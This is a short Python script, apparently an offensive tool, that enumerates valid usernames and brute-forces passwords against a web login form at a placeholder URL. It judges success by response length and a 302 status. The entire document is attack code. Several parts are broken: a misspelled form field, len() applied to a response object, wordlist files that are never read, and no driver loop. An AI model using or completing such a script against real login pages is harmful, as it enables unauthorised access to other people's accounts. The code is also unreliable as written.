import requests

URL = "https://urlsite.com"
USERNAME = "username.txt"
PASSWORD = "password.txt"
HEADERS = {
    "Content-Type":"application/x-www-form-urlencoded"
}

def check_username(username):
    data = {
        "username": username,
        "passweord": "password"
    }
    response = requests.post(URL,headers=HEADERS,data=data)
    if len(response) >= 2986:
        print (f"[v] USERNAME VALID")
        return True
    else:
        print(f"[x] USERNAME TIDAK VALID")
        return False

def try_password(username,password):
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(URL,headers=HEADERS,data=data)
    if response.status_code == 302 and len(response.text) == 170:
        print(f"[v] LOGIN BERHASIL")
        return True
    else:
        print(f"{username}:{password}")
        return False

